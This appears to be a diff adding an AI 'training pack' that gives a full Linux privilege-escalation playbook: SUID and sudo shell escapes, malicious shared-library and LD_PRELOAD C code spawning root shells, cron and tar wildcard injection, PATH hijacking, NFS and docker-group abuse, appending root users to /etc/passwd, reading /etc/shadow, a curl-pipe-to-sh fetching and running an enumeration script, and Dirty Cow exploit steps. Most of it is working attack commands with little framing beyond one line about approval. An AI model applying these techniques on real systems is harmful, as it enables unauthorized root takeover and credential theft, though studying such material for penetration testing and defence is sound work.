@@ -1,0 +1,413 @@
+================================================================================
+TITAN AI — TRAINING PACK 041: LINUX PRIVILEGE ESCALATION — COMPLETE GUIDE
+SUID/GUID, CAPABILITIES, SUDO MISCONFIGS, CRON, PATH HIJACK, WILDCARD INJECTION
+================================================================================
+
+================================================================================
+PART 1: ENUMERATION METHODOLOGY
+================================================================================
+
+--- SYSTEMATIC ENUMERATION ---
+
+FIRST COMMANDS AFTER SHELL:
+  id                                    # Who am I? Groups?
+  whoami                                # Username
+  hostname                              # Machine name
+  uname -a                              # Kernel version (check for kernel exploits)
+  cat /etc/os-release                   # OS and version
+  cat /proc/version                     # More kernel details
+  env                                   # Environment variables (secrets?)
+  echo $PATH                            # PATH (hijack opportunities)
+  history                               # Command history (credentials?)
+
+NETWORK:
+  ip addr / ifconfig                    # Network interfaces (multi-homed?)
+  ip route / netstat -rn                # Routing (pivot to other networks?)
+  ss -tulpn / netstat -tulpn            # Listening services (internal services?)
+  cat /etc/hosts                        # Hosts file (internal FQDNs?)
+
+USER AND GROUP INFORMATION:
+  cat /etc/passwd                       # All users, shells, home dirs
+  cat /etc/group                        # All groups and members
+  cat /etc/shadow                       # Hashed passwords (if readable)
+  lastlog                               # When did each user last login?
+  last                                  # Recent logins
+  who                                   # Currently logged in users
+  w                                     # Who is logged in and what they're doing
+
+AUTOMATED TOOLS:
+  linPEAS: Most comprehensive. Finds and highlights likely privesc paths.
+  LinEnum: Classic, still useful.
+  linux-smart-enumeration (lse.sh): Score-based output, prioritizes findings.
+  
+  Run: curl https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
+  Or: Upload to target, chmod +x, execute. Redirected output contains all findings.
+
+================================================================================
+PART 2: SUID/SGID EXPLOITATION
+================================================================================
+
+--- FINDING SUID BINARIES ---
+
+  find / -perm -4000 -type f 2>/dev/null   # Find SUID files (set-uid bit)
+  find / -perm -2000 -type f 2>/dev/null   # Find SGID files
+  find / -perm -6000 -type f 2>/dev/null   # Both
+
+LEGITIMATE SUID BINARIES (harmless normally):
+  /usr/bin/passwd, /usr/bin/sudo, /usr/bin/su, /usr/bin/pkexec, /bin/ping
+
+HIGH-VALUE SUID EXPLOITATION:
+
+find (SUID):
+  find . -exec /bin/sh -p \; -quit
+  # -exec runs command. /bin/sh -p preserves SUID. -quit stops after first match.
+  # Result: Shell running as root (if find is SUID root).
+
+vim / vi (SUID):
+  vim -c ':!/bin/sh'  # Run shell command from vim
+  vim -c ':set shell=/bin/sh' -c ':shell'
+
+nmap (SUID, older versions <5.20):
+  nmap --interactive    # Interactive mode
+  nmap> !sh             # Spawn shell from interactive prompt
+
+python / python3 (SUID):
+  python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+
+cp (SUID):
+  # Can overwrite /etc/passwd:
+  echo 'attacker:$6$salt$<hash>:0:0:root:/root:/bin/bash' >> /etc/passwd
+  cp /etc/passwd /etc/passwd.bak  # (if SUID cp can read/write)
+  # Or add passwordless root:
+  echo 'attacker::0:0:root:/root:/bin/bash' >> /etc/passwd  # No password hash
+
+bash / sh (SUID):
+  bash -p       # -p: Don't reset EUID. Shell runs with SUID privileges.
+  # Direct shell as root.
+
+GTFOBins: The definitive reference for SUID/SUDO/capabilities abuse.
+  Website: gtfobins.github.io
+  For every dangerous binary: Shell escape, file read, file write, SUID, sudo techniques.
+
+--- SHARED LIBRARY INJECTION (SUID BINARY) ---
+
+  When SUID binary loads a shared library from a path you can write to:
+  
+  Step 1: Use strace to find library loads
+  strace /usr/local/bin/vulnerable-suid 2>&1 | grep "open\|access" | grep "\.so"
+  # Look for: open("/lib/vulnerable_lib.so", O_RDONLY) = -1 ENOENT (missing library!)
+  
+  Step 2: If library missing from writable path:
+  # Create malicious library:
+  cat > /tmp/exploit.c << 'EOF'
+  #include <stdio.h>
+  #include <stdlib.h>
+  
+  void __attribute__((constructor)) init() {
+      setuid(0);
+      setgid(0);
+      system("/bin/bash -p");
+  }
+  EOF
+  
+  gcc -shared -fPIC -o /path/writable/vulnerable_lib.so /tmp/exploit.c
+  # Next run of SUID binary: Loads our library → constructor runs → root shell.
+
+================================================================================
+PART 3: SUDO MISCONFIGURATIONS
+================================================================================
+
+--- SUDO ENUMERATION ---
+
+  sudo -l    # List what current user can run with sudo
+
+READING OUTPUT:
+  (ALL) ALL: User can run any command as any user. Full sudo. Root.
+  (root) /usr/bin/vim: Can run vim as root only.
+  (ALL : ALL) NOPASSWD: ALL: No password required. Full root.
+  (root) NOPASSWD: /usr/bin/python3 /opt/scripts/backup.py: Specific script, no password.
+
+SUDO ESCAPES (GTFOBins):
+
+  sudo vim:
+  sudo vim -c ':!/bin/bash'
+  
+  sudo less:
+  sudo less /etc/passwd → press 'v' → opens in editor → shell escape
+  sudo less /etc/passwd → type '!/bin/bash' → shell
+  
+  sudo awk:
+  sudo awk 'BEGIN {system("/bin/bash")}'
+  
+  sudo find:
+  sudo find / -exec /bin/bash \; -quit
+  
+  sudo nano:
+  sudo nano → Ctrl+R → Ctrl+X → type: reset; sh 1>&0 2>&0
+  
+  sudo man:
+  sudo man man → type '!/bin/bash' → shell as root
+  
+  sudo tar:
+  sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
+  
+  sudo git:
+  sudo git -p help config → type '!/bin/bash'
+  
+  sudo python3:
+  sudo python3 -c 'import os; os.system("/bin/bash")'
+  
+  sudo env:
+  sudo env /bin/bash    # Inherit environment and run bash as root
+
+SUDO ABUSE — ENVIRONMENT VARIABLES:
+  sudo LD_PRELOAD: If env_keep += LD_PRELOAD in sudoers:
+  
+  # Create malicious shared library:
+  cat > /tmp/preload.c << 'EOF'
+  #include <stdio.h>
+  #include <sys/types.h>
+  #include <stdlib.h>
+  void _init() {
+      unsetenv("LD_PRELOAD");
+      setgid(0);
+      setuid(0);
+      system("/bin/bash");
+  }
+  EOF
+  gcc -fPIC -shared -o /tmp/preload.so /tmp/preload.c -nostartfiles
+  
+  sudo LD_PRELOAD=/tmp/preload.so find  # Runs find as root, preloads our library first.
+
+WILDCARDS IN SUDO:
+  (root) /usr/bin/python3 /opt/scripts/*.py
+  
+  Bypass: Create file with argument as filename:
+  touch /opt/scripts/--help.py   # Filename starts with --
+  # Expands to: python3 /opt/scripts/--help.py ... = python3 --help ...
+  # Or: Create payload.py with malicious content in that directory (if writable).
+
+================================================================================
+PART 4: CAPABILITIES
+================================================================================
+
+--- LINUX CAPABILITIES ---
+
+Linux capabilities: Break root privileges into discrete units.
+Process can have specific capabilities WITHOUT being root.
+File capabilities: Binary can be executed with specific capabilities (like SUID but granular).
+
+FINDING CAPABILITIES:
+  getcap -r / 2>/dev/null    # Find all files with capabilities set
+
+HIGH-VALUE CAPABILITIES FOR PRIVESC:
+
+cap_setuid:
+  Allows: setuid() to any UID.
+  
+  # Python with cap_setuid:
+  python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+
+cap_net_raw:
+  Allows: Raw socket operations. Packet sniffing/forging.
+  
+  # tcpdump with cap_net_raw: Can capture all traffic
+  tcpdump -i eth0 -w /tmp/capture.pcap   # Captures everything including cleartext creds
+
+cap_sys_admin:
+  Extremely powerful. Mount filesystems, manage namespaces, many more.
+  
+  # Mount a tmpfs and overwrite things:
+  mount -t tmpfs tmpfs /mnt
+  # Various kernel exploit enablers
+
+cap_chown:
+  Allows: Changing ownership of any file.
+  
+  # Take ownership of /etc/shadow:
+  python3 -c "import os; os.chown('/etc/shadow', 1000, 1000)"
+  # Now readable by our user. Contains hashed passwords. Crack offline.
+
+cap_dac_read_search:
+  Bypass file read permission checks.
+  
+  # Read any file regardless of permissions:
+  python3 -c "print(open('/etc/shadow').read())"
+  # (if python has this capability)
+
+cap_dac_override:
+  Bypass all file permission checks (read, write, execute).
+  
+  # Write to any file:
+  # Could add SSH key to root, modify /etc/passwd, etc.
+
+================================================================================
+PART 5: CRON JOB EXPLOITATION
+================================================================================
+
+--- FINDING CRON JOBS ---
+
+  cat /etc/crontab                          # System-wide cron
+  cat /etc/cron.d/*                         # Drop-in cron files
+  cat /var/spool/cron/crontabs/root         # Root's personal cron (if readable)
+  ls -la /etc/cron.hourly /etc/cron.daily   # Scripts run hourly/daily
+  
+  pspy64: Monitor processes in real-time without root.
+  # Upload pspy64 to target, run it, wait to see what cron jobs execute.
+  # Shows: Exact command line including script paths.
+  ./pspy64 2>/dev/null | grep -v "\[pspy\]"
+
+EXPLOITATION PATHS:
+
+Path 1: Writable script run by root cron:
+  crontab: * * * * * root /opt/maintenance/backup.sh
+  
+  ls -la /opt/maintenance/backup.sh
+  # Output: -rwxrwxrwx root root backup.sh  ← WORLD WRITABLE
+  
+  echo 'chmod u+s /bin/bash' >> /opt/maintenance/backup.sh
+  # Wait one minute. bash becomes SUID.
+  bash -p  # Root shell.
+
+Path 2: Script calls binary from writable PATH:
+  backup.sh:
+  #!/bin/bash
+  tar czf /backup/data.tar.gz /home/user
+  
+  If PATH includes writable directory BEFORE /bin or /usr/bin:
+  echo $PATH   # e.g., /home/user/bin:/usr/local/bin:/usr/bin:/bin
+  
+  mkdir -p /home/user/bin
+  cat > /home/user/bin/tar << 'EOF'
+  #!/bin/bash
+  chmod u+s /bin/bash
+  EOF
+  chmod +x /home/user/bin/tar
+  # Next cron run: Calls /home/user/bin/tar (our fake tar) not /bin/tar.
+
+Path 3: Wildcard injection in cron tar:
+  Cron: tar czf /backup/archive.tar.gz /home/user/files/*
+  
+  The * expands to all files in /home/user/files/.
+  tar interprets filenames beginning with - as options.
+  
+  Create files with option-like names:
+  cd /home/user/files
+  touch -- '--checkpoint=1'
+  touch -- '--checkpoint-action=exec=chmod u+s /bin/bash'
+  
+  When cron runs: tar czf ... --checkpoint=1 --checkpoint-action=exec=chmod u+s /bin/bash ...
+  tar executes the checkpoint action! bash becomes SUID.
+
+================================================================================
+PART 6: PATH HIJACKING
+================================================================================
+
+--- WRITEABLE PATH DIRECTORIES ---
+
+If any directory in $PATH is writable AND comes before the legitimate binary path:
+  Find writable dirs in PATH:
+  echo $PATH | tr ':' '\n' | xargs -I{} sh -c 'ls -ld {} 2>/dev/null' | grep "^d.w"
+  
+  Or: for dir in $(echo $PATH | tr ':' '\n'); do ls -ld $dir 2>/dev/null; done
+
+CLASSIC PATH HIJACK (SUID script calling relative command):
+  # Vulnerable SUID script:
+  cat /usr/local/bin/backup  # SUID script
+  # Contents:
+  #!/bin/bash
+  cp /home/user/data /backup/data   # Uses 'cp' from PATH — not /bin/cp!
+  
+  # Inject into PATH:
+  echo "/tmp" >> ~/.bashrc  # Or current shell if not sourced
+  export PATH=/tmp:$PATH
+  
+  cat > /tmp/cp << 'EOF'
+  #!/bin/bash
+  /bin/bash -p
+  EOF
+  chmod +x /tmp/cp
+  
+  /usr/local/bin/backup    # Runs our /tmp/cp → root shell.
+
+================================================================================
+PART 7: OTHER PRIVESC TECHNIQUES
+================================================================================
+
+--- NFS ROOT SQUASH MISCONFIGURATION ---
+
+  cat /etc/exports    # NFS export configuration
+  
+  If: /share *(rw,no_root_squash)
+  no_root_squash: Remote root user treated as root. Not squashed to nobody.
+  
+  From attacker machine:
+  showmount -e TARGET_IP
+  mount TARGET_IP:/share /mnt
+  cp /bin/bash /mnt/bash
+  chmod u+s /mnt/bash    # We're root on our machine → sets SUID on shared filesystem
+  
+  On target:
+  /mnt/bash -p   # SUID bash → root shell
+
+--- DOCKER GROUP ---
+
+  id | grep docker    # Are we in docker group?
+  
+  Docker group = effectively root. Can mount host filesystem into container.
+  
+  docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+  # Container has access to host's / at /mnt.
+  # chroot into it → full host root access.
+  
+  Add SSH key to root:
+  docker run -v /root/.ssh:/mnt/root/.ssh --rm alpine \
+    sh -c "echo 'SSH_PUBLIC_KEY' >> /mnt/root/.ssh/authorized_keys"
+
+--- WRITABLE /ETC/PASSWD ---
+
+  ls -la /etc/passwd     # World-writable? (misconfiguration)
+  
+  # Generate password hash:
+  openssl passwd -6 "password123"    # SHA-512 hash
+  
+  # Append new root user:
+  echo 'hacker:$6$salt$hashedpassword:0:0:root:/root:/bin/bash' >> /etc/passwd
+  
+  su hacker   # Switch to hacker (password: password123) → root shell.
+
+--- KERNEL EXPLOITS ---
+
+  uname -r    # Check kernel version
+  
+  Search: CVE for that kernel + privilege escalation
+  
+  Notable kernel privilege escalation CVEs:
+  Dirty Cow (CVE-2016-5195): 2.6.22-4.8.3. Race condition → write to read-only.
+  PwnKit (CVE-2021-4034): pkexec SUID → universal root (since 2009).
+  GameOver(lay) (CVE-2023-2640, CVE-2023-32629): Ubuntu overlayfs. Local root.
+  Dirty Pipe (CVE-2022-0847): 5.8-5.16. Overwrite files opened read-only.
+  
+  USE WITH CAUTION: Kernel exploits can crash the system.
+  Test on copy first. In CTF: Often safe. In real engagement: Get approval.
+
+DIRTY COW USAGE:
+  git clone https://github.com/dirtycow/dirtycow.github.io
+  # Multiple exploit variants: c0w (modify /etc/passwd), dirty.c (modify any file)
+  
+  gcc -pthread dirty.c -o dirty -lcrypt
+  ./dirty [password]
+  # Creates root user "firefart" with specified password.
+  su firefart
+
+================================================================================
+END OF PACK 041: LINUX PRIVILEGE ESCALATION
+Total: Systematic enumeration (commands, linPEAS/LinEnum), SUID exploitation (find/vim/
+nmap/python/cp/bash GTFOBins techniques), shared library injection for SUID binaries,
+sudo misconfiguration (sudo -l output interpretation, all major escape techniques,
+LD_PRELOAD injection, wildcard bypass), Linux capabilities (cap_setuid/cap_chown/
+cap_dac_read_search/cap_dac_override exploitation), cron exploitation (writable
+script/PATH injection/wildcard injection with tar), PATH hijacking (writable directory
+detection and exploitation), NFS no_root_squash, docker group abuse, writable /etc/passwd,
+kernel exploits (Dirty Cow/PwnKit/Dirty Pipe).
+================================================================================
